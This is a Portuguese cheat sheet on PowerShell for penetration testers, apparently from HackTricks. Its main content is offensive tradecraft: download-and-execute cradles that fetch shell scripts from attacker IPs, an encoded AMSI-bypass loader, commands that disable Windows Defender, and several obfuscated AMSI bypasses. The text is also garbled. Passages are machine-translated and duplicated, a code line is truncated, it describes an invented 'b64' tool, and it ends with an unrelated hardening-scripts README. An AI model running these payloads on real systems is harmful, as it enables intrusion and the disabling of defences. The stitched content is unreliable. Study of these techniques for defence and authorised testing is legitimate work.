# PowerShell B√°sico para Pentesters

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Localiza√ß√µes padr√£o do PowerShell
```powershell
C:\windows\syswow64\windowspowershell\v1.0\powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell
```
## Comandos b√°sicos do PowerShell para come√ßar

O PowerShell √© uma poderosa ferramenta de linha de comando e automa√ß√£o desenvolvida pela Microsoft. √â amplamente utilizado por pentesters para realizar v√°rias tarefas durante um teste de penetra√ß√£o. Abaixo est√£o alguns comandos b√°sicos do PowerShell que podem ser √∫teis para come√ßar:

### Get-Process
O comando `Get-Process` √© usado para obter informa√ß√µes sobre os processos em execu√ß√£o no sistema. Ele exibe detalhes como o ID do processo, nome do processo, uso de CPU e mem√≥ria.

Exemplo de uso:
```
Get-Process
```

### Get-Service
O comando `Get-Service` √© usado para obter informa√ß√µes sobre os servi√ßos em execu√ß√£o no sistema. Ele exibe detalhes como o nome do servi√ßo, status, modo de inicializa√ß√£o e descri√ß√£o.

Exemplo de uso:
```
Get-Service
```

### Get-EventLog
O comando `Get-EventLog` √© usado para obter informa√ß√µes sobre os logs de eventos do sistema. Ele permite visualizar eventos espec√≠ficos, como logs de seguran√ßa, logs de aplicativos e logs do sistema.

Exemplo de uso:
```
Get-EventLog -LogName Security
```

### Get-WmiObject
O comando `Get-WmiObject` √© usado para obter informa√ß√µes do Windows Management Instrumentation (WMI). Ele permite acessar informa√ß√µes do sistema, como configura√ß√µes de hardware, software instalado e muito mais.

Exemplo de uso:
```
Get-WmiObject -Class Win32_ComputerSystem
```

### Get-ChildItem
O comando `Get-ChildItem` √© usado para listar os arquivos e pastas em um diret√≥rio espec√≠fico. Ele exibe detalhes como nome, tamanho, data de cria√ß√£o e atributos dos arquivos e pastas.

Exemplo de uso:
```
Get-ChildItem C:\Users
```

Esses s√£o apenas alguns dos comandos b√°sicos do PowerShell que podem ser √∫teis para come√ßar. O PowerShell oferece uma ampla gama de recursos e funcionalidades avan√ßadas que podem ser exploradas para fins de pentesting.
```powershell
Get-Help * #List everything loaded
Get-Help process #List everything containing "process"
Get-Help Get-Item -Full #Get full helpabout a topic
Get-Help Get-Item -Examples #List examples
Import-Module <modulepath>
Get-Command -Module <modulename>
```
## Baixar e Executar

To download and execute a file using PowerShell, you can use the following command:

Para baixar e executar um arquivo usando o PowerShell, voc√™ pode usar o seguinte comando:

```powershell
Invoke-WebRequest -Uri <URL> -OutFile <output_file>; .\<output_file>
```

Replace `<URL>` with the URL of the file you want to download, and `<output_file>` with the desired name for the downloaded file.

Substitua `<URL>` pela URL do arquivo que voc√™ deseja baixar e `<output_file>` pelo nome desejado para o arquivo baixado.

For example, to download a file named `payload.exe` from `http://example.com/payload.exe` and execute it, you would use the following command:

Por exemplo, para baixar um arquivo chamado `payload.exe` de `http://example.com/payload.exe` e execut√°-lo, voc√™ usaria o seguinte comando:

```powershell
Invoke-WebRequest -Uri http://example.com/payload.exe -OutFile payload.exe; .\payload.exe
```

Make sure to exercise caution when downloading and executing files from the internet, as they may contain malicious content. Always verify the source and integrity of the file before executing it.

Certifique-se de ter cuidado ao baixar e executar arquivos da internet, pois eles podem conter conte√∫do malicioso. Sempre verifique a origem e a integridade do arquivo antes de execut√°-lo.
```powershell
g
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile - #From cmd download and execute
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
iex (iwr '10.10.14.9:8000/ipw.ps1') #From PSv3

$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://10.10.14.9:8000/ipw.ps1',$false);$h.send();iex $h.responseText
$wr = [System.NET.WebRequest]::Create("http://10.10.14.9:8000/ipw.ps1") $r = $wr.GetResponse() IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd(

#https://twitter.com/Alh4zr3d/status/1566489367232651264
#host a text record with your payload at one of your (unburned) domains and do this:
powershell . (nslookup -q=txt http://some.owned.domain.com)[-1]
```
### Baixar e Executar em segundo plano com Bypass AMSI

Este script PowerShell permite baixar e executar um arquivo em segundo plano, contornando o AMSI (Antimalware Scan Interface).

#### Uso

1. Abra o PowerShell como administrador.
2. Execute o seguinte comando para habilitar a execu√ß√£o de scripts n√£o assinados:
```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
```
3. Execute o seguinte comando para baixar e executar o arquivo em segundo plano:
```powershell
IEX (New-Object Net.WebClient).DownloadString('URL_DO_ARQUIVO')
```
Substitua `URL_DO_ARQUIVO` pela URL do arquivo que deseja baixar e executar.

#### Observa√ß√µes

- Certifique-se de que voc√™ tem permiss√µes de administrador para executar o PowerShell.
- O AMSI √© um recurso de seguran√ßa do Windows que verifica scripts PowerShell em busca de malware. O bypass do AMSI pode ser considerado uma t√©cnica de evas√£o.
- Tenha cuidado ao executar scripts de fontes desconhecidas, pois isso pode representar um risco de seguran√ßa.
```powershell
Start-Process -NoNewWindow powershell "-nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA="
```
### Usando b64 no Linux

O comando `b64` √© uma ferramenta √∫til para codificar e decodificar dados em base64 no Linux. Ele pode ser usado para v√°rias finalidades, como a manipula√ß√£o de dados codificados em base64 durante testes de penetra√ß√£o. 

#### Codificando dados em base64

Para codificar dados em base64 usando o comando `b64`, voc√™ pode executar o seguinte comando:

```
echo "dados" | b64 -e
```

Substitua "dados" pelos dados que voc√™ deseja codificar. O comando acima ir√° codificar os dados em base64 e exibir o resultado na sa√≠da padr√£o.

#### Decodificando dados em base64

Para decodificar dados em base64 usando o comando `b64`, voc√™ pode executar o seguinte comando:

```
echo "dados codificados em base64" | b64 -d
```

Substitua "dados codificados em base64" pelos dados que voc√™ deseja decodificar. O comando acima ir√° decodificar os dados em base64 e exibir o resultado na sa√≠da padr√£o.

#### Exemplo de uso

Aqui est√° um exemplo de como usar o comando `b64` para codificar e decodificar dados em base64:

```
echo "Hello, World!" | b64 -e
```

Isso ir√° codificar a string "Hello, World!" em base64 e exibir o resultado na sa√≠da padr√£o. Para decodificar o resultado em base64 de volta para a string original, voc√™ pode executar o seguinte comando:

```
echo "SGVsbG8sIFdvcmxkIQ==" | b64 -d
```

Isso ir√° decodificar a string em base64 "SGVsbG8sIFdvcmxkIQ==" e exibir o resultado "Hello, World!" na sa√≠da padr√£o.
```powershell
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
powershell -nop -enc <BASE64_ENCODED_PAYLOAD>
```
## Download

### System.Net.WebClient

O `System.Net.WebClient` √© uma classe do .NET Framework que fornece m√©todos para fazer download de arquivos da web. √â uma ferramenta √∫til para pentesters que desejam baixar arquivos de um servidor remoto durante um teste de penetra√ß√£o.

#### Exemplo de Uso

```powershell
$webClient = New-Object System.Net.WebClient
$url = "https://www.example.com/file.txt"
$destination = "C:\path\to\save\file.txt"
$webClient.DownloadFile($url, $destination)
```

Neste exemplo, criamos uma inst√¢ncia do `System.Net.WebClient` e definimos a URL do arquivo que desejamos baixar e o local onde queremos salv√°-lo. Em seguida, usamos o m√©todo `DownloadFile` para iniciar o download do arquivo.

#### Observa√ß√µes

- Certifique-se de ter permiss√£o para baixar o arquivo desejado.
- Verifique se o destino especificado √© acess√≠vel e tem permiss√£o de grava√ß√£o.
- Tenha cuidado ao baixar arquivos de fontes desconhecidas, pois eles podem conter malware ou serem usados para realizar ataques de phishing.
```powershell
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
```
O comando `Invoke-WebRequest` √© usado para enviar solicita√ß√µes HTTP e HTTPS para um servidor web. Ele permite que os pentesters realizem v√°rias a√ß√µes, como fazer o download de arquivos, enviar dados para um formul√°rio da web e obter informa√ß√µes de uma p√°gina da web.

#### Sintaxe

```powershell
Invoke-WebRequest [-Uri] <string> [-Method <WebRequestMethod>] [-Headers <IDictionary>] [-Body <Object>] [-ContentType <string>] [-UserAgent <string>] [-TimeoutSec <int>] [-Proxy <Uri>] [-ProxyCredential <PSCredential>] [-UseBasicParsing] [-SessionVariable <string>] [-WebSession <WebRequestSession>] [-MaximumRedirection <int>] [-SkipCertificateCheck] [<CommonParameters>]
```

#### Par√¢metros

- `-Uri`: Especifica a URL do servidor web para enviar a solicita√ß√£o.
- `-Method`: Especifica o m√©todo HTTP a ser usado na solicita√ß√£o, como GET, POST, PUT, DELETE, etc.
- `-Headers`: Especifica os cabe√ßalhos HTTP personalizados a serem inclu√≠dos na solicita√ß√£o.
- `-Body`: Especifica o corpo da solicita√ß√£o, que pode ser usado para enviar dados para um formul√°rio da web ou para enviar uma carga √∫til personalizada.
- `-ContentType`: Especifica o tipo de conte√∫do do corpo da solicita√ß√£o.
- `-UserAgent`: Especifica o agente do usu√°rio a ser usado na solicita√ß√£o.
- `-TimeoutSec`: Especifica o tempo limite, em segundos, para a solicita√ß√£o.
- `-Proxy`: Especifica o servidor proxy a ser usado para a solicita√ß√£o.
- `-ProxyCredential`: Especifica as credenciais a serem usadas para autentica√ß√£o no servidor proxy.
- `-UseBasicParsing`: Especifica se o analisador HTML b√°sico deve ser usado para analisar a resposta.
- `-SessionVariable`: Especifica o nome da vari√°vel para armazenar a sess√£o da solicita√ß√£o.
- `-WebSession`: Especifica uma sess√£o da solicita√ß√£o existente a ser usada.
- `-MaximumRedirection`: Especifica o n√∫mero m√°ximo de redirecionamentos permitidos.
- `-SkipCertificateCheck`: Especifica se a verifica√ß√£o do certificado SSL deve ser ignorada.

#### Exemplos

1. Fazendo uma solicita√ß√£o GET para uma p√°gina da web:

```powershell
Invoke-WebRequest -Uri "https://www.example.com"
```

2. Fazendo uma solicita√ß√£o POST com dados de formul√°rio:

```powershell
Invoke-WebRequest -Uri "https://www.example.com/login" -Method POST -Body @{username="admin"; password="password"} -ContentType "application/x-www-form-urlencoded"
```

3. Fazendo o download de um arquivo:

```powershell
Invoke-WebRequest -Uri "https://www.example.com/file.txt" -OutFile "C:\path\to\save\file.txt"
```

4. Enviando uma solicita√ß√£o com cabe√ßalhos personalizados:

```powershell
$headers = @{
    "Authorization" = "Bearer token123"
    "Content-Type" = "application/json"
}

Invoke-WebRequest -Uri "https://www.example.com/api" -Headers $headers
```

#### Observa√ß√µes

- O comando `Invoke-WebRequest` √© uma ferramenta poderosa para interagir com servidores web durante um teste de penetra√ß√£o. Ele permite que os pentesters enviem solicita√ß√µes personalizadas e obtenham informa√ß√µes √∫teis para identificar vulnerabilidades e explorar sistemas.
```powershell
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
```
### Wget

Wget is a command-line utility that allows you to retrieve files from the web. It supports downloading files using various protocols such as HTTP, HTTPS, and FTP. Wget is commonly used in penetration testing to download files from target systems.

To use Wget, you need to open a command prompt or terminal and enter the following command:

```
wget [URL]
```

Replace `[URL]` with the URL of the file you want to download. Wget will then retrieve the file and save it to your current directory.

Wget also supports options that allow you to customize the download process. For example, you can use the `-O` option to specify a different name for the downloaded file, or the `-P` option to specify a different directory to save the file in.

Here are some examples of how you can use Wget:

- Download a file from a specific URL:
```
wget https://example.com/file.txt
```

- Download a file and save it with a different name:
```
wget -O newfile.txt https://example.com/file.txt
```

- Download a file and save it to a specific directory:
```
wget -P /path/to/directory https://example.com/file.txt
```

Wget is a powerful tool that can be used for various purposes, including downloading files during penetration testing. It is important to use it responsibly and within the boundaries of the law.
```powershell
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"
```
### BitsTransfer

O BitsTransfer √© um m√≥dulo do PowerShell que permite transferir arquivos entre computadores usando o protocolo Background Intelligent Transfer Service (BITS). O BITS √© um servi√ßo do Windows que permite transfer√™ncias de arquivos em segundo plano, de forma ass√≠ncrona e com suporte a pausa e retomada.

O m√≥dulo BitsTransfer fornece cmdlets (comandos) que permitem iniciar, pausar, retomar e cancelar transfer√™ncias de arquivos usando o BITS. Ele tamb√©m permite monitorar o progresso das transfer√™ncias e exibir informa√ß√µes detalhadas sobre cada transfer√™ncia.

Os cmdlets do BitsTransfer s√£o √∫teis para pentesters, pois permitem transferir arquivos de forma eficiente durante um teste de penetra√ß√£o. Por exemplo, voc√™ pode usar o cmdlet Start-BitsTransfer para transferir um arquivo malicioso para um sistema alvo e, em seguida, usar o cmdlet Get-BitsTransfer para monitorar o progresso da transfer√™ncia.

O BitsTransfer √© uma ferramenta poderosa para pentesters que desejam explorar vulnerabilidades em sistemas Windows. No entanto, √© importante us√°-lo com responsabilidade e apenas para fins legais e √©ticos.
```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
# OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
## Base64 Kali & EncodedCommand

Neste tutorial, vamos explorar como usar o Base64 no Kali Linux para codificar comandos PowerShell. O Base64 √© um m√©todo de codifica√ß√£o que converte dados em uma sequ√™ncia de caracteres ASCII, permitindo que sejam transmitidos e armazenados de forma segura.

O PowerShell √© uma poderosa ferramenta de automa√ß√£o e gerenciamento de tarefas no Windows. Ao codificar comandos PowerShell em Base64, podemos evitar a detec√ß√£o de antiv√≠rus e outras medidas de seguran√ßa, tornando nossas atividades de pentesting mais furtivas.

### Codificando comandos PowerShell em Base64

Para codificar um comando PowerShell em Base64, podemos usar o seguinte comando no Kali Linux:

```bash
echo "Comando PowerShell" | base64
```

Substitua "Comando PowerShell" pelo comando que deseja codificar. Por exemplo, se quisermos codificar o comando `Get-Process`, o comando completo seria:

```bash
echo "Get-Process" | base64
```

O resultado ser√° uma sequ√™ncia de caracteres Base64 que representa o comando PowerShell.

### Executando comandos PowerShell codificados

Depois de codificar um comando PowerShell em Base64, podemos execut√°-lo usando o seguinte comando no Windows:

```powershell
powershell.exe -EncodedCommand "C√≥digo Base64"
```

Substitua "C√≥digo Base64" pela sequ√™ncia de caracteres Base64 que representa o comando PowerShell codificado. Por exemplo, se tivermos a sequ√™ncia de caracteres Base64 `R2V0LVByb2Nlc3M=`, o comando completo seria:

```powershell
powershell.exe -EncodedCommand "R2V0LVByb2Nlc3M="
```

Isso executar√° o comando PowerShell codificado no sistema Windows.

### Considera√ß√µes finais

O uso do Base64 para codificar comandos PowerShell pode ser uma t√©cnica √∫til para evitar a detec√ß√£o de antiv√≠rus e outras medidas de seguran√ßa durante atividades de pentesting. No entanto, √© importante lembrar que o uso indevido dessas t√©cnicas pode ser ilegal e anti√©tico. Sempre obtenha permiss√£o adequada antes de realizar qualquer teste de seguran√ßa em sistemas ou redes.
```powershell
kali> echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
PS> powershell -EncodedCommand <Base64>
```
## [Pol√≠tica de Execu√ß√£o](../authentication-credentials-uac-and-efs.md#ps-execution-policy)

## [Linguagem Restrita](broken-reference/)

## [Pol√≠tica do AppLocker](broken-reference/)

## Habilitar o WinRM (PS Remoto)
```powershell
enable-psremoting -force #This enables winrm

# Change NetWorkConnection Category to Private
#Requires -RunasAdministrator

Get-NetConnectionProfile |
Where{ $_.NetWorkCategory -ne 'Private'} |
ForEach {
$_
$_|Set-NetConnectionProfile -NetWorkCategory Private -Confirm
}
```
## Desativar o Defender

{% code overflow="wrap" %}
```powershell
# Check status
Get-MpComputerStatus
Get-MpPreference | select Exclusion* | fl #Check exclusions
# Disable
Set-MpPreference -DisableRealtimeMonitoring $true
#To completely disable Windows Defender on a computer, use the command:
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
# Set exclusion path
Set-MpPreference -ExclusionPath (pwd) -disablerealtimemonitoring
Add-MpPreference -ExclusionPath (pwd)

# Check exclusions configured via GPO
Parse-PolFile .\Registry.pol

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions
ValueName : Exclusions_Paths
ValueType : REG_DWORD
ValueLength : 4
ValueData : 1

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions\Paths
ValueName : C:\Windows\Temp
ValueType : REG_SZ
ValueLength : 4
ValueData : 0
```
{% endcode %}

### Bypass AMSI

O arquivo **`amsi.dll`** √© **carregado** no seu processo e possui as **exporta√ß√µes** necess√°rias para qualquer aplicativo interagir com ele. E como ele √© carregado no espa√ßo de mem√≥ria de um processo que voc√™ **controla**, voc√™ pode alterar seu comportamento **sobrescrevendo instru√ß√µes na mem√≥ria**. Fazendo com que ele n√£o detecte nada.

Portanto, o objetivo dos bypasses do AMSI √© **sobrescrever as instru√ß√µes dessa DLL na mem√≥ria para tornar a detec√ß√£o in√∫til**.

P√°gina da web do gerador de bypass do AMSI: [**https://amsi.fail/**](https://amsi.fail/)
```powershell
# A Method
[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)

# Another: from https://github.com/tihanyin/PSSW100AVB/blob/main/AMSI_bypass_2021_09.ps1
$A="5492868772801748688168747280728187173688878280688776828"
$B="1173680867656877679866880867644817687416876797271"
[Ref].Assembly.GetType([string](0..37|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " " ).
GetField([string](38..51|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " ",'NonPublic,Static').
SetValue($null,$true)

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
[Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).SetValue($null,$true)

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
&( $SHELLid[1]+$SHELlId[13]+'X') (NeW-OBJEct sYStEm.iO.coMPrESSIOn.defLAtEstReam( [iO.meMorYStReAm] [cOnvErt]::froMBaSE64StRINg( 'rVHRasJAEHzvdwhGkBAhLUXwYU7i2aKFq4mQBh8Sc6bBM5HkYmq/vruQfkF7L3s7s8vM3CXv+nRw0bb6kpm7K7UN71ftjJwk1F/WDapjnZdVcZjPo6qku+aRnW0Ic5JlXd10Y4lcNfVFpK1+8gduHPXiEestcggD6WFTiDfIAFkhPiGP+FDCQkbce1j6UErMsFbIesYD3rtCPhOPDgHtKfENecZe0TzVDNRjsRhP6LCpValN/g/GYzZGxlMlXiF9rh6CGISToZ6Nn3+Fp3+XCwtxY5kIlF++cC6S2WIDEfJ7xEPeuMeQdaftPjUdfVLVGTMd2abTk4cf'), [sysTEm.iO.cOmpResSioN.COMprEssiOnMOde]::decOMPRESs ) | foreAch{NeW-OBJEct iO.STREaMREadER( $_ , [teXt.ENCoDiNg]::aScii )}).REadtoenD( )

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
${2}=[Ref].Assembly.GetType('Sy'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB0AGUA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQAuAE0A')))+'an'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBnAGUA')))+'m'+'en'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAAuAEEAdQA=')))+'t'+'om'+'at'+'io'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgAuAEEA')))+'ms'+'i'+'U'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABpAGwA')))+'s')
${1}=${2}.GetField('am'+'s'+'iI'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBpAHQA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbAA=')))+'ed','No'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBQAHUA')))+'bl'+'i'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwAsAFMA')))+'ta'+'ti'+'c')
${1}.SetValue($null,$true)

# Another Method
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$field.SetValue($null,$true)

# AMSI Bypass in python
https://fluidattacks.com/blog/amsi-bypass-python/

# Testing for Amsi Bypass:
https://github.com/rasta-mouse/AmsiScanBufferBypass

# Amsi-Bypass-Powershell
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

https://blog.f-secure.com/hunting-for-amsi-bypasses/
https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
https://github.com/cobbr/PSAmsi/wiki/Conducting-AMSI-Scans
https://slaeryan.github.io/posts/falcon-zero-alpha.html
```
### Bypass AMSI 2 - Hooking de Chamada de API Gerenciada

Verifique [**este post para informa√ß√µes detalhadas**](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/)\*\*\*\*[ **e o c√≥digo**](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/).

Essa nova t√©cnica baseia-se no hooking de chamadas de API de m√©todos .NET. Acontece que os m√©todos .NET precisam ser compilados em instru√ß√µes nativas da m√°quina na mem√≥ria, que acabam se parecendo muito com m√©todos nativos. Esses m√©todos compilados podem ser hookados para alterar o fluxo de controle de um programa.

Os passos para realizar o hooking de chamadas de API de m√©todos .NET s√£o:

1. Identificar o m√©todo alvo para o hooking
2. Definir um m√©todo com o mesmo prot√≥tipo de fun√ß√£o que o alvo
3. Usar reflex√£o para encontrar os m√©todos
4. Garantir que cada m√©todo tenha sido compilado
5. Encontrar a localiza√ß√£o de cada m√©todo na mem√≥ria
6. Sobrescrever o m√©todo alvo com instru√ß√µes apontando para nosso m√©todo malicioso

## Hist√≥rico do PS
```powershell
Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```
## Obter permiss√µes

To gather information about the permissions assigned to a user or group in a Windows system, you can use PowerShell commands. PowerShell provides several cmdlets that allow you to retrieve and analyze permissions.

### Get-Acl

The `Get-Acl` cmdlet retrieves the access control list (ACL) for a specified file or directory. It returns an object that contains information about the permissions assigned to the file or directory.

```powershell
Get-Acl -Path C:\Path\To\File.txt
```

### Get-NTFSAccess

The `Get-NTFSAccess` cmdlet retrieves the NTFS permissions for a specified file or directory. It returns an object that contains information about the permissions assigned to the file or directory, including the user or group, access rights, and inheritance settings.

```powershell
Get-NTFSAccess -Path C:\Path\To\File.txt
```

### Get-ADPermission

The `Get-ADPermission` cmdlet retrieves the Active Directory permissions for a specified user or group. It returns an object that contains information about the permissions assigned to the user or group, including the access rights and inheritance settings.

```powershell
Get-ADPermission -Identity "Domain\User"
```

By using these PowerShell cmdlets, you can easily gather information about the permissions assigned to users or groups in a Windows system. This information can be valuable for identifying potential security vulnerabilities and ensuring proper access control.
```powershell
Get-Acl -Path "C:\Program Files\Vuln Services" | fl
```
## Vers√£o do sistema operacional e HotFixes

O PowerShell pode ser usado para obter informa√ß√µes sobre a vers√£o do sistema operacional e os HotFixes instalados. Isso pode ser √∫til para identificar vulnerabilidades conhecidas e garantir que o sistema esteja atualizado.

### Obtendo a vers√£o do sistema operacional

Para obter a vers√£o do sistema operacional, voc√™ pode usar o seguinte comando:

```powershell
(Get-WmiObject -Class Win32_OperatingSystem).Caption
```

Isso retornar√° a vers√£o do sistema operacional instalado no computador.

### Obtendo a lista de HotFixes

Para obter a lista de HotFixes instalados, voc√™ pode usar o seguinte comando:

```powershell
Get-HotFix
```

Isso retornar√° uma lista de todos os HotFixes instalados no sistema, incluindo o nome, descri√ß√£o, data de instala√ß√£o e n√∫mero de identifica√ß√£o.

√â importante verificar regularmente se h√° atualiza√ß√µes e instalar os HotFixes mais recentes para garantir a seguran√ßa do sistema operacional.
```powershell
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
## Ambiente

---

## Description

---

## Descri√ß√£o

This repository contains basic PowerShell scripts that can be used by pentesters during Windows hardening engagements. These scripts are designed to help pentesters automate common tasks and perform security assessments on Windows systems.

Este reposit√≥rio cont√©m scripts b√°sicos do PowerShell que podem ser usados por pentesters durante as atividades de fortalecimento do Windows. Esses scripts foram projetados para ajudar os pentesters a automatizar tarefas comuns e realizar avalia√ß√µes de seguran√ßa em sistemas Windows.

## Usage

---

## Uso

To use these scripts, you will need to have PowerShell installed on your Windows machine. Simply download the script you want to use and run it using the PowerShell command line.

Para usar esses scripts, voc√™ precisar√° ter o PowerShell instalado em sua m√°quina Windows. Basta baixar o script que voc√™ deseja usar e execut√°-lo usando a linha de comando do PowerShell.

```powershell
PS C:\> .\script.ps1
```

## Scripts

---

## Scripts

- **disable-weak-ciphers.ps1**: This script disables weak ciphers on the Windows system.

- **disable-weak-ciphers.ps1**: Este script desativa cifras fracas no sistema Windows.

- **enable-firewall.ps1**: This script enables the Windows Firewall and configures basic rules.

- **enable-firewall.ps1**: Este script ativa o Firewall do Windows e configura regras b√°sicas.

- **disable-unnecessary-services.ps1**: This script disables unnecessary services on the Windows system.

- **disable-unnecessary-services.ps1**: Este script desativa servi√ßos desnecess√°rios no sistema Windows.

- **enable-bitlocker.ps1**: This script enables BitLocker drive encryption on the Windows system.

- **enable-bitlocker.ps1**: Este script ativa a criptografia de unidade BitLocker no sistema Windows.

- **disable-remote-desktop.ps1**: This script disables Remote Desktop on the Windows system.

- **disable-remote-desktop.ps1**: Este script desativa o Remote Desktop no sistema Windows.

- **enable-windows-update.ps1**: This script enables automatic Windows updates on the Windows system.

- **enable-windows-update.ps1**: Este script ativa as atualiza√ß√µes autom√°ticas do Windows no sistema Windows.

- **disable-powershell-remoting.ps1**: This script disables PowerShell remoting on the Windows system.

- **disable-powershell-remoting.ps1**: Este script desativa o PowerShell remoting no sistema Windows.

- **enable-windows-defender.ps1**: This script enables Windows Defender on the Windows system.

- **enable-windows-defender.ps1**: Este script ativa o Windows Defender no sistema Windows.

